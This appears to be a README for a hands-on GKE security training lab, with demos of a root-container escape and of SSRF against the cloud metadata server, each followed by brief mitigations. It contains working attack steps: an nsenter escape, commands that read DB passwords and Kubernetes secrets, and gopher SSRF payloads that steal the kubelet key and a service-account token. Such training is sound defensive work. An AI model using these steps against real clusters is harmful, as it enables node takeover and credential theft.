# training-gke-security
This repository is for training of GKE Security

[![Open in Cloud Shell](http://gstatic.com/cloudssh/images/open-btn.png)](https://console.cloud.google.com/cloudshell/open?git_repo=https://github.com/rung/training-gke-security&page=editor&cloudshell_tutorial=README.md)

## Preparation
#### Set project id
```bash
PROJECT_ID="Your Project Name"
gcloud config set project $PROJECT_ID
```

#### Enable GKE API
```bash
gcloud services enable container.googleapis.com
```

#### Create GKE Cluster
```bash
gcloud container clusters create gke-security-testing --zone us-central1-a --machine-type g1-small --num-nodes 3 --async
```

#### Get a credential of GKE
```bash
gcloud container clusters get-credentials gke-security-testing --zone=us-central1-a
```

#### Testing
```
kubectl get node
```

#### Deploy web server
```
kubectl apply -f manifest -R
```
- Please don't expose deployment on the Internet through Service.

## Demo 1: PodSecurityPolicy
#### Run root container
```
kubectl apply -f manifest/root/pod.yaml
```

#### Enter root
```
kubectl exec -it root-container -- /bin/sh -c "nsenter --mount=/proc/1/ns/mnt -- /bin/bash"
```

#### Get credentials
```
docker ps -q | xargs docker inspect --format='{{range .Config.Env}}{{println .}}{{end}}' | grep DB_Password
```

#### (References) Get credentials(method 2)
```
kubectl --kubeconfig /var/lib/kubelet/kubeconfig get secret dummy-secret -o yaml
```

#### How to block
  - RBAC
  - exec

## Demo 2: Workload Identity
#### Port-forward
```
kubectl port-forward deployment/ssrf-server 8080:8080
```

#### Open Web Preview
<img src="img/web-preview.png" width="320">

#### Input url (for testing)
```
https://www.google.com
```

#### Input malicious url
#### Get kubelet key
```
gopher://169.254.169.254:80/_GET /computeMetadata/v1/instance/attributes/kube-env?alt=json HTTP/1.1%0d%0aMetadata-Flavor: Google%0d%0aConnection: Close%0d%0a%0d%0a
```
It contains "KUBELET_KEY".

#### Save the metadata
- ctrl+A and store all result to `metadata-script/metadata.txt` file
  - TODO: ADD image

#### Get node certificate
```bash
cd metadata-script

# Extract necessary data from metadata
bash extract.sh
ls -l metadata

# Get node certificate
bash make_cert.sh $(cat metadata/nodename)
```

#### Get credentials
```
# Set env vars
KUBE_OPT="--client-certificate newcert/node.crt --client-key newcert/new.key --certificate-authority metadata/ca.crt --server https://$(cat metadata/api_ip)"
echo $KUBE_OPT

# Get secretName
kubectl describe pod | grep secret

# Get secret
kubectl get secret dummy-secret -o yaml
```

#### (Reference) Get instance token (doesn't use it in this training)
```
gopher://169.254.169.254:80/_GET /computeMetadata/v1/instance/service-accounts/default/token HTTP/1.1%0d%0aMetadata-Flavor: Google%0d%0aConnection: Close%0d%0a%0d%0a
```

### How to block
#### [Workload Identity](https://cloud.google.com/kubernetes-engine/docs/how-to/workload-identity)
```
gcloud beta container clusters update gke-security-testing --identity-namespace=${PROJECT_ID}.svc.id.goog --region us-central1-a
```

```
cloud beta container node-pools update [NODEPOOL_NAME] \
  --cluster=[CLUSTER_NAME] \
  --workload-metadata-from-node=GKE_METADATA_SERVER
```

## (After this training) Delete cluster
```bash
gcloud container clusters delete gke-security-testing --zone us-central1-a --async
```

## References
- [SSRF in Exchange leads to ROOT access in all instances](https://hackerone.com/reports/341876)
- [Hacking Kubelet on Google Kubernetes Engine](https://www.4armed.com/blog/hacking-kubelet-on-gke/)
- [The Path Less Traveled: Abusing Kubernetes Defaults](https://speakerdeck.com/iancoldwater/the-path-less-traveled-abusing-kubernetes-defaults)
